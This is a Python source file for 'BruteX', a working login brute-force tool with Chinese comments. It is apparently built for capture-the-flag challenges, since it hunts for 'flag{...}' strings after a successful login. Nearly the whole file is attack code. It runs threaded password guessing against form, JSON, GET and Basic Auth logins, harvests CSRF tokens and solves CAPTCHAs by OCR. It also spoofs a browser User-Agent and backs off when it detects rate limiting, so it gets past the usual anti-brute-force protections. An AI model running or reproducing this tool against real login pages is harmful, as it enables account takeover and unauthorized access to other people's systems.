#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BruteX — 通用登录爆破工具 v2.1
支持: Flask/Django/PHP/API (JSON/Form) / BasicAuth / GET 参数
支持: 多用户/单用户、自动表单分析、代理、速率检测、验证码OCR识别

用法:
  # 带验证码的登录页
  python brute.py http://target/login -u admin --auto-form --captcha

  # 指定验证码参数名
  python brute.py http://target/login -u admin --captcha --captcha-field verify_code

  # 手动指定验证码图片URL
  python brute.py http://target/login -u admin --captcha-url http://target/captcha.php

  # 其他标准用法
  python brute.py http://target/login -u admin -d config/admin-top500.txt
"""
import requests
import sys
import os
import re
import json
import time
import argparse
import io
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from base64 import b64encode

BASE = os.path.dirname(os.path.abspath(__file__))
PROJECT = os.path.dirname(BASE)
sys.path.insert(0, PROJECT)

VERSION = "2.1"

# ---- 尝试导入验证码 OCR ----
try:
    import ddddocr
    _ocr = ddddocr.DdddOcr(show_ad=False)
    OCR_AVAILABLE = True
except ImportError:
    OCR_AVAILABLE = False
    _ocr = None

try:
    from PIL import Image, ImageFilter, ImageEnhance
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False


# ============================================================
#  辅助函数
# ============================================================

def eprint(*args, **kwargs):
    """输出到 stderr，不干扰管道输出"""
    print(*args, file=sys.stderr, **kwargs)


def color(text, code="36"):
    """终端颜色"""
    return f"\033[{code}m{text}\033[0m"


def banner():
    eprint(color("=" * 60, "33"))
    version_tag = f"BruteX v{VERSION}" + (" [+CAPTCHA]" if OCR_AVAILABLE else "")
    eprint(color(f"  {version_tag} — 登录爆破工具", "33"))
    if not OCR_AVAILABLE:
        eprint(color("  [!] ddddocr 未安装, 验证码识别不可用", "31"))
    eprint(color("=" * 60, "33"))


def ensure_dict(dict_arg):
    """解析字典路径"""
    paths_to_try = [
        dict_arg,
        os.path.join(BASE, dict_arg),
        os.path.join(BASE, dict_arg.replace("config/", "")),
        os.path.join(PROJECT, "config", os.path.basename(dict_arg)),
        os.path.join(PROJECT, "config", dict_arg.replace("config/", "")),
        os.path.join(PROJECT, "config", "dictionaries", os.path.basename(dict_arg)),
        os.path.join(PROJECT, "config", "dictionaries", dict_arg.replace("config/", "")),
    ]
    for p in paths_to_try:
        if os.path.exists(p):
            return p
    eprint(color(f"[X] 字典文件不存在: {dict_arg}", "31"))
    eprint("    可用字典:")
    for f in sorted(os.listdir(BASE)):
        if f.endswith(".txt") and ("pass" in f.lower() or "dict" in f.lower()):
            eprint(f"       config/{f}")
    sys.exit(1)


def load_lines(path):
    """读取文件，去空行和注释"""
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]


# ============================================================
#  验证码识别器
# ============================================================

class CaptchaSolver:
    """
    验证码识别
    1. 自动检测: 分析登录页 HTML 找到验证码图片 URL 和对应字段名
    2. 手动指定: --captcha-url 和 --captcha-field
    3. 每次请求前刷新验证码
    """

    def __init__(self, session, url, args):
        self.session = session
        self.login_url = url
        self.args = args

        # 验证码图片 URL（可缓存相对路径，每次请求时拼接完整 URL）
        self.captcha_img_url = None

        # 验证码字段名
        self.captcha_field = args.captcha_field or "captcha"

        # 是否已检测完毕
        self.analyzed = False

        # OCR 统计
        self.ocr_ok = 0
        self.ocr_fail = 0

        # 是否启用
        self.enabled = args.captcha

        if self.enabled and not OCR_AVAILABLE:
            eprint(color("  [!] --captcha 启用但 ddddocr 不可用, 尝试安装: pip install ddddocr", "31"))
            self.enabled = False

    def analyze(self, html):
        """从登录页 HTML 中自动检测验证码"""
        if not self.enabled:
            return

        # 如果用户已手动指定验证码 URL，直接使用
        if self.args.captcha_url:
            self.captcha_img_url = self.args.captcha_url
            eprint(color(f"  [CAPTCHA] 手动指定图片URL: {self.captcha_img_url}", "36"))
            self.analyzed = True
            return

        # 自动检测: 找包含 captcha/验证码 关键词的 img 标签
        captcha_keywords = ["captcha", "verify", "verification", "code",
                            "验证码", "安全码", "图形码", "rand", "checkcode",
                            "seccode", "authcode", "vcode", "identifying"]

        img_pattern = re.compile(r'<img[^>]*src=["\']([^"\']+)["\'][^>]*>', re.I)
        for img_tag in re.finditer(r'<img[^>]*>', html, re.I):
            img_src = re.search(r'src=["\']([^"\']+)["\']', img_tag.group(), re.I)
            img_lower = img_tag.group().lower()
            if img_src:
                # 检查图片关键词或者 alt 属性
                matched = any(kw in img_lower for kw in captcha_keywords)
                alt_match = re.search(r'alt=["\']([^"\']*)["\']', img_tag.group(), re.I)
                if alt_match:
                    matched = matched or any(kw in alt_match.group(1).lower() for kw in captcha_keywords)
                if matched:
                    self.captcha_img_url = img_src.group(1)
                    eprint(color(f"  [CAPTCHA] 自动检测到验证码图片: {self.captcha_img_url}", "36"))
                    break

        # 找验证码输入框字段名
        input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', re.I)
        for inp in re.finditer(r'<input[^>]*>', html, re.I):
            inp_lower = inp.group().lower()
            name_m = re.search(r'name=["\']([^"\']+)["\']', inp.group(), re.I)
            if name_m and any(kw in inp_lower for kw in captcha_keywords):
                self.captcha_field = name_m.group(1)
                eprint(color(f"  [CAPTCHA] 检测到验证码字段: {self.captcha_field}", "36"))
                break

        if not self.captcha_img_url:
            eprint(color("  [CAPTCHA] 自动检测未找到验证码图片，尝试使用 --captcha-url 手动指定", "33"))
        else:
            self.analyzed = True

    def solve(self):
        """
        获取并识别验证码
        返回: (识别结果文本, 是否成功)
        """
        if not self.enabled or not self.captcha_img_url:
            return "", False

        try:
            # 拼接完整 URL（相对路径 -> 绝对路径）
            img_url = urljoin(self.login_url, self.captcha_img_url)

            # 下载图片
            resp = self.session.get(img_url, timeout=10)
            if resp.status_code != 200:
                self.ocr_fail += 1
                return "", False

            img_data = resp.content

            # 图片预处理（提高 OCR 准确率）
            if PIL_AVAILABLE and len(img_data) > 100:
                try:
                    img = Image.open(io.BytesIO(img_data))
                    # 转灰度
                    if img.mode != "L":
                        img = img.convert("L")
                    # 增加对比度
                    enhancer = ImageEnhance.Contrast(img)
                    img = enhancer.enhance(2.0)
                    # 二值化
                    img = img.point(lambda x: 0 if x < 128 else 255)
                    # 存回 bytes
                    buf = io.BytesIO()
                    img.save(buf, format="PNG")
                    img_data = buf.getvalue()
                except Exception:
                    pass  # 预处理失败，用原始图片

            # OCR 识别
            result = _ocr.classification(img_data)
            result = result.strip()

            if result and len(result) >= 2:
                self.ocr_ok += 1
                return result, True
            else:
                self.ocr_fail += 1
                return "", False

        except Exception as e:
            self.ocr_fail += 1
            return "", False

    def get_status(self):
        """返回状态字符串"""
        if not self.enabled:
            return ""
        total = self.ocr_ok + self.ocr_fail
        rate = self.ocr_ok * 100 / total if total > 0 else 0
        return f"CAPTCHA: OK={self.ocr_ok} FAIL={self.ocr_fail} ({rate:.0f}%)"


# ============================================================
#  表单分析器（含验证码检测）
# ============================================================

class FormAnalyzer:
    """自动分析登录页表单字段"""

    def __init__(self, session):
        self.session = session

    def analyze(self, url):
        """GET 登录页 -> 提取表单字段"""
        try:
            resp = self.session.get(url, timeout=10)
            html = resp.text
            fields = {"username": "username", "password": "password"}
            extra_data = {}

            # 找 input 字段
            inputs = re.findall(r'<input[^>]*>', html, re.I)
            input_names = []
            for inp in inputs:
                m_name = re.search(r'name=["\']([^"\']+)["\']', inp)
                m_type = re.search(r'type=["\']([^"\']+)["\']', inp)
                m_val = re.search(r'value=["\']([^"\']*)["\']', inp)
                name = m_name.group(1) if m_name else None
                itype = m_type.group(1).lower() if m_type else "text"
                ival = m_val.group(1) if m_val else ""
                if name:
                    input_names.append(name)
                    if itype == "password":
                        fields["password"] = name
                    elif itype == "text" or itype == "email":
                        # 跳过验证码字段
                        captcha_kw = ["captcha", "verify", "code", "验证码", "验证"]
                        if not any(k in name.lower() for k in captcha_kw):
                            fields["username"] = name
                    elif itype == "hidden":
                        extra_data[name] = ival

            # 找 CSRF token
            for pat in [r'csrf[_-]?token[^>]*content=["\']([^"\']+)',
                        r'csrf[_-]?token[^>]*value=["\']([^"\']+)',
                        r'_token[^>]*value=["\']([^"\']+)',
                        r'csrfmiddlewaretoken[^>]*value=["\']([^"\']+)']:
                m = re.search(pat, html, re.I)
                if m:
                    for n in input_names:
                        if "csrf" in n.lower() or "token" in n.lower():
                            extra_data[n] = m.group(1)
                            break

            eprint(color(f"  [i] 自动分析表单: username={fields['username']}, password={fields['password']}", "36"))
            if extra_data:
                eprint(color(f"  [i] 额外字段: {extra_data}", "36"))
            return fields, extra_data, html
        except Exception as e:
            eprint(color(f"  [i] 自动分析失败，使用默认字段: {e}", "33"))
            return {"username": "username", "password": "password"}, {}, ""


# ============================================================
#  请求执行器（含验证码）
# ============================================================

class BruteForcer:
    """爆破核心"""

    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        })
        if args.cookie:
            self.session.headers.update({"Cookie": args.cookie})
        if args.header:
            for h in args.header:
                if ":" in h:
                    k, v = h.split(":", 1)
                    self.session.headers[k.strip()] = v.strip()
        if args.proxy:
            self.session.proxies = {"http": args.proxy, "https": args.proxy}
            eprint(color(f"  [i] 使用代理: {args.proxy}", "36"))

        # 自动表单分析
        self.form_fields = {"username": "username", "password": "password"}
        self.extra_data = {}
        page_html = ""
        if args.auto_form:
            analyzer = FormAnalyzer(self.session)
            self.form_fields, self.extra_data, page_html = analyzer.analyze(args.url)

        self.user_field = self.form_fields["username"]
        self.pass_field = self.form_fields["password"]

        # 验证码
        self.captcha = CaptchaSolver(self.session, args.url, args)
        if args.captcha and args.auto_form and page_html:
            self.captcha.analyze(page_html)
        elif args.captcha:
            self.captcha.analyze("<html></html>")  # 触发启用但不自动检测

        # 基准响应
        self.baseline_size = None
        self._get_baseline(args.url)

    def _get_baseline(self, url):
        """获取基准响应（失败的响应大小）"""
        try:
            data = self._build_payload_base("__baseline_test__", "__baseline_test__")
            if self.args.json:
                resp = self.session.post(url, json=data, timeout=10)
            else:
                resp = self.session.post(url, data=data, timeout=10)
            self.baseline_size = len(resp.text)
            eprint(color(f"  [i] 基准响应大小: {self.baseline_size} bytes", "36"))
        except:
            self.baseline_size = 0

    def _build_payload_base(self, username, password):
        """构造请求数据（不含验证码）"""
        if self.args.json:
            return {self.user_field: username, self.pass_field: password}
        else:
            data = dict(self.extra_data)
            data[self.user_field] = username
            data[self.pass_field] = password
            return data

    def build_payload(self, username, password):
        """构造请求数据（含验证码）"""
        data = self._build_payload_base(username, password)

        # 如有验证码，实时识别填充
        if self.captcha.enabled:
            code, ok = self.captcha.solve()
            if ok:
                data[self.captcha.captcha_field] = code
                # 进度条输出验证码
                sys.stderr.write(f" [{code}] ")
                sys.stderr.flush()
            else:
                # 识别失败，用一个随机值占位（大概率被拒绝）
                import random
                data[self.captcha.captcha_field] = f"x{random.randint(1000,9999)}"

        return data

    def try_login(self, username, password):
        """尝试一次登录，返回 (username, password, result, size, status)"""
        try:
            data = self.build_payload(username, password)
            method = self.args.method.upper()
            if method == "GET":
                resp = self.session.get(self.args.url, params=data, timeout=self.args.timeout,
                                        allow_redirects=False)
            else:
                if self.args.json:
                    resp = self.session.post(self.args.url, json=data, timeout=self.args.timeout,
                                             allow_redirects=False)
                else:
                    resp = self.session.post(self.args.url, data=data, timeout=self.args.timeout,
                                             allow_redirects=False)

            return self._judge(username, password, resp)
        except requests.exceptions.Timeout:
            return username, password, "timeout", 0, 0
        except Exception as e:
            return username, password, f"error:{e}", 0, 0

    def _judge(self, username, password, resp):
        """判断登录结果"""
        text = resp.text.lower()
        size = len(text)
        status = resp.status_code

        # 1. Flag 直接匹配
        flags = re.findall(r'flag\{[^}]+\}', resp.text)
        if flags:
            return username, password, f"flag:{','.join(flags)}", size, status

        # 2. 验证码错误检测（快速 -> 失败，不计入限速）
        captcha_fail_kw = ["验证码错误", "验证码不正确", "验证码已失效",
                           "captcha error", "invalid captcha", "wrong captcha",
                           "验证码输入错误"]
        for kw in captcha_fail_kw:
            if kw in text:
                return username, password, "captcha_fail", size, status

        # 3. 自定义成功标识
        if self.args.success:
            if self.args.success.lower() in text:
                return username, password, "success", size, status

        # 4. 自定义失败标识
        if self.args.fail:
            if self.args.fail.lower() in text:
                return username, password, "fail", size, status

        # 5. 30x 重定向到非登录页
        if status in (301, 302, 307, 308):
            location = resp.headers.get("Location", "")
            if location and "login" not in location.lower():
                return username, password, f"redirect:{location}", size, status

        # 6. 响应大小突变
        if self.baseline_size and size > 0:
            ratio = size / self.baseline_size
            if ratio > 1.5 or ratio < 0.5:
                return username, password, f"suspect(size_ratio={ratio:.2f})", size, status

        # 7. 关键词匹配
        success_kw = ["flag{", "登录成功", "welcome", "dashboard", "admin",
                       "success", "logout", "profile", "redirect"]
        fail_kw = ["密码错误", "用户名错误", "登录失败", "invalid", "error",
                    "incorrect", "wrong", "forbidden", "unauthorized"]

        for kw in success_kw:
            if kw in text:
                return username, password, "success", size, status
        for kw in fail_kw:
            if kw in text:
                return username, password, "fail", size, status

        return username, password, "unknown", size, status


# ============================================================
#  速率限制检测
# ============================================================

class RateLimiter:
    """检测和应对速率限制"""

    def __init__(self):
        self.consecutive_timeouts = 0
        self.consecutive_fails = 0
        self.max_timeouts = 3
        self.max_fails = 5
        self.current_delay = 0

    def check(self, result):
        """根据结果判断是否被限速"""
        # 验证码错误不算限速
        if result == "captcha_fail":
            return False

        if result == "timeout":
            self.consecutive_timeouts += 1
        else:
            self.consecutive_timeouts = 0

        if result == "fail":
            self.consecutive_fails += 1
        else:
            self.consecutive_fails = 0

        if self.consecutive_timeouts >= self.max_timeouts:
            self.current_delay = min(self.current_delay + 1.0, 5.0)
            eprint(color(f"\n  [!] 检测到限速，降速至 {self.current_delay}s 间隔", "33"))
            self.consecutive_timeouts = 0
            return True

        if self.consecutive_fails >= self.max_fails:
            eprint(color(f"\n  [!] 连续失败，可能被封 IP", "31"))
            return True

        return False

    def wait(self):
        if self.current_delay > 0:
            time.sleep(self.current_delay)


# ============================================================
#  主流程
# ============================================================

def main():
    banner()

    parser = argparse.ArgumentParser(
        description=f"BruteX 通用登录爆破工具 v{VERSION}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # Flask 登录
  python brute.py http://target/login -u admin -d config/admin-top500.txt

  # 多用户爆破
  python brute.py http://target/login -U users.txt -d 10k-passwords.txt -t 5

  # 带验证码
  python brute.py http://target/login -u admin --auto-form --captcha

  # 验证码 + 手动指定字段
  python brute.py http://target/login -u admin --auto-form --captcha --captcha-field verify

  # 手动指定验证码图片 URL
  python brute.py http://target/login -u admin --captcha --captcha-url http://target/captcha.php

  # JSON API + 自定义字段
  python brute.py http://target/api/login -u admin --json --user-field email --pass-field passwd

  # 自动分析 + 代理调式
  python brute.py http://target/login -u admin --auto-form --proxy http://127.0.0.1:8080

  # Basic Auth 爆破
  python brute.py http://target/ --basic-auth -u admin -d 10k-passwords.txt

  # GET 参数登录
  python brute.py http://target/check.php -u admin --method GET
        """
    )

    # ---- 目标参数 ----
    parser.add_argument("url", help="登录页 URL")

    # ---- 用户参数 ----
    user_group = parser.add_mutually_exclusive_group()
    user_group.add_argument("-u", "--username", default=None, help="单个用户名")
    user_group.add_argument("-U", "--userlist", help="用户名字典文件")

    # ---- 字典参数 ----
    parser.add_argument("-d", "--dict", default="top100-passwords.txt",
                        help="密码字典文件 (默认: top100-passwords.txt)")

    # ---- 请求参数 ----
    parser.add_argument("--method", default="POST", choices=["POST", "GET"],
                        help="请求方法 (默认: POST)")
    parser.add_argument("--json", action="store_true",
                        help="使用 JSON 格式 (Content-Type: application/json)")
    parser.add_argument("--basic-auth", action="store_true",
                        help="使用 HTTP Basic Auth 认证")
    parser.add_argument("--user-field", default=None,
                        help="用户名字段名 (默认: 自动或 username)")
    parser.add_argument("--pass-field", default=None,
                        help="密码字段名 (默认: 自动或 password)")
    parser.add_argument("--auto-form", action="store_true",
                        help="自动分析登录页表单字段")
    parser.add_argument("--cookie", default=None, help="自定义 Cookie")
    parser.add_argument("--header", "-H", action="append", default=None,
                        help="自定义请求头, 如 'X-Forwarded-For: 127.0.0.1'")
    parser.add_argument("--proxy", default=None,
                        help="HTTP 代理, 如 http://127.0.0.1:8080")
    parser.add_argument("--timeout", type=int, default=8, help="请求超时秒数 (默认: 8)")

    # ---- 验证码参数 ----
    parser.add_argument("--captcha", action="store_true",
                        help="启用验证码识别 (需 ddddocr)")
    parser.add_argument("--captcha-field", default=None,
                        help="验证码字段名 (默认: 自动或 captcha)")
    parser.add_argument("--captcha-url", default=None,
                        help="验证码图片 URL (不指定则自动检测)")

    # ---- 判断参数 ----
    parser.add_argument("--success", default=None,
                        help="自定义成功标志 (关键词)")
    parser.add_argument("--fail", default=None,
                        help="自定义失败标志 (关键词)")

    # ---- 并发参数 ----
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="并发线程数 (默认: 10)")
    parser.add_argument("--delay", type=float, default=0,
                        help="请求间隔秒数 (默认: 0)")

    args = parser.parse_args()

    # ---- 验证码依赖检查 ----
    if args.captcha and not OCR_AVAILABLE:
        eprint(color("\n  [X] --captcha 需要 ddddocr, 请安装:", "31"))
        eprint("       pip install ddddocr")
        eprint("       或先不启用验证码继续爆破\n")
        sys.exit(1)

    # ---- 参数校验 ----
    dict_path = ensure_dict(args.dict)
    passwords = load_lines(dict_path)

    usernames = []
    if args.userlist:
        usernames = load_lines(args.userlist)
        eprint(color(f"  [*] 多用户模式: {len(usernames)} 个用户", "36"))
    else:
        uname = args.username or "admin"
        usernames = [uname]
        eprint(color(f"  [*] 单用户模式: {uname}", "36"))

    eprint(color(f"  [*] 目标: {args.url}", "36"))
    eprint(color(f"  [*] 密码字典: {dict_path} ({len(passwords)} 条)", "36"))
    eprint(color(f"  [*] 线程: {args.threads}", "36"))
    if args.captcha:
        eprint(color(f"  [*] 验证码: 已启用 (ddddocr)", "36"))

    # ---- 初始化爆破器 ----
    forcer = BruteForcer(args)

    # 覆盖字段名（如果用户指定）
    if args.user_field:
        forcer.user_field = args.user_field
    if args.pass_field:
        forcer.pass_field = args.pass_field

    eprint(color(f"  [*] 字段映射: {forcer.user_field}=username, {forcer.pass_field}=password", "36"))
    if forcer.captcha.enabled:
        eprint(color(f"  [*] 验证码字段: {forcer.captcha.captcha_field}", "36"))
    eprint(color("-" * 60, "33"))

    # ---- 准备任务队列 ----
    tasks = []
    for uname in usernames:
        for pwd in passwords:
            tasks.append((uname, pwd))
    eprint(color(f"  [*] 总任务数: {len(tasks)}", "36"))

    if args.basic_auth:
        def try_basic(uname, pwd):
            try:
                auth_str = b64encode(f"{uname}:{pwd}".encode()).decode()
                headers = {"Authorization": f"Basic {auth_str}"}
                resp = requests.get(args.url, headers=headers, timeout=args.timeout)
                if resp.status_code == 200:
                    return uname, pwd, "success", len(resp.text), 200
                return uname, pwd, "fail", len(resp.text), resp.status_code
            except Exception as e:
                return uname, pwd, f"error:{e}", 0, 0
        try_func = try_basic
    else:
        try_func = forcer.try_login

    # ---- 开始爆破 ----
    rate_limiter = RateLimiter()
    found_credentials = []
    done = 0
    captcha_errors = 0
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        fut_map = {executor.submit(try_func, u, p): (u, p) for u, p in tasks}
        for future in as_completed(fut_map):
            done += 1
            uname, pwd, result, size, status = future.result()

            # 进度
            elapsed = time.time() - start_time
            rate = done / elapsed if elapsed > 0 else 0
            eta = (len(tasks) - done) / rate if rate > 0 else 0

            # 进度条（含验证码状态）
            cap_status = forcer.captcha.get_status()
            progress = f"\r  [{done}/{len(tasks)}] {done*100//len(tasks)}% 速率:{rate:.0f}/s ETA:{eta:.0f}s"
            if cap_status:
                progress += f" [{cap_status}]"
            progress += f" 当前: {uname}:{pwd}"
            sys.stderr.write(progress)
            sys.stderr.flush()

            # 统计验证码错误
            if result == "captcha_fail":
                captcha_errors += 1

            # 速率限制检测（验证码错误不计入）
            rate_limiter.check(result)

            # 成功
            if result.startswith("flag:") or result == "success":
                found_credentials.append((uname, pwd, result, size, status))
                eprint(color(f"\n\n  [OK] 成功! 凭证: {uname}:{pwd}  [{result}] (size={size}, status={status})", "32"))
                if args.basic_auth:
                    _post_basic(args.url, uname, pwd)
                else:
                    _post_find(args, uname, pwd)
                return

            # flag 在响应中
            if result.startswith("flag:"):
                flags = result.replace("flag:", "").split(",")
                eprint(color(f"\n\n  [FLAG] {', '.join(flags)}", "32;1"))
                return

            # 可疑
            if result.startswith("suspect") or result.startswith("redirect"):
                found_credentials.append((uname, pwd, result, size, status))

            # 延迟
            if args.delay > 0:
                time.sleep(args.delay)
            rate_limiter.wait()

    # ---- 结束 ----
    elapsed = time.time() - start_time
    eprint(color(f"\n\n{'='*60}", "33"))
    eprint(color(f"  爆破完成! 耗时: {elapsed:.1f}s, 速率: {len(tasks)/elapsed:.0f}/s", "33"))
    if forcer.captcha.enabled:
        eprint(color(f"  验证码统计: {forcer.captcha.ocr_ok} OK / {forcer.captcha.ocr_fail} FAIL", "36"))
        if captcha_errors > 0:
            eprint(color(f"  服务器拒绝(验证码错误): {captcha_errors} 次", "33"))
    eprint(color(f"{'='*60}", "33"))

    if found_credentials:
        eprint(color(f"\n  [!] 可疑凭证 ({len(found_credentials)} 个):", "33"))
        for uname, pwd, result, size, status in found_credentials[:10]:
            eprint(f"     {uname}:{pwd:25s} [{result:20s}] size={size} status={status}")
    else:
        eprint(color(f"\n  [*] 未找到有效凭证", "31"))
        eprint("    建议:")
        eprint("       1. 检查用户名是否正确 (试试 -U users.txt)")
        eprint("       2. 检查字典是否合适 (试试 config/admin-top500.txt)")
        eprint("       3. 用 --auto-form 分析表单字段名")
        eprint("       4. 如果是验证码问题: 用 --proxy 挂代理看验证码是否正常刷新")
        eprint("       5. 用 --proxy http://127.0.0.1:8080 配合 mitmweb 调试请求")


def _post_find(args, uname, pwd):
    """登录成功后查找 flag"""
    session = requests.Session()
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}

    data = {uname: uname, pwd: pwd}
    try:
        resp = session.post(args.url, data=data, allow_redirects=True, timeout=10)
    except:
        pass

    paths = ["/flag", "/admin", "/dashboard", "/home", "/profile",
             "/api/flag", "/getflag", "/secret", "/admin/flag"]
    for path in paths:
        try:
            full_url = urljoin(args.url, path)
            resp = session.get(full_url, timeout=5)
            flags = re.findall(r'flag\{[^}]+\}', resp.text)
            if flags:
                for f in flags:
                    eprint(color(f"\n  [FLAG] {f}  (from {full_url})", "32;1"))
                return
            if "flag" in resp.text.lower():
                eprint(color(f"\n  [?] {path} 包含 'flag' 关键词, 响应:\n{resp.text[:500]}", "33"))
        except:
            pass

    eprint(color(f"\n  [?] 登录成功，但未找到 flag。尝试手动检查...", "33"))


def _post_basic(url, uname, pwd):
    """Basic Auth 成功后查找 flag"""
    auth = requests.auth.HTTPBasicAuth(uname, pwd)
    for path in ["/flag", "/admin", "/", "/api/flag"]:
        try:
            resp = requests.get(urljoin(url, path), auth=auth, timeout=5)
            flags = re.findall(r'flag\{[^}]+\}', resp.text)
            if flags:
                for f in flags:
                    eprint(color(f"\n  [FLAG] {f}  (from {path})", "32;1"))
                return
        except:
            pass


if __name__ == "__main__":
    main()
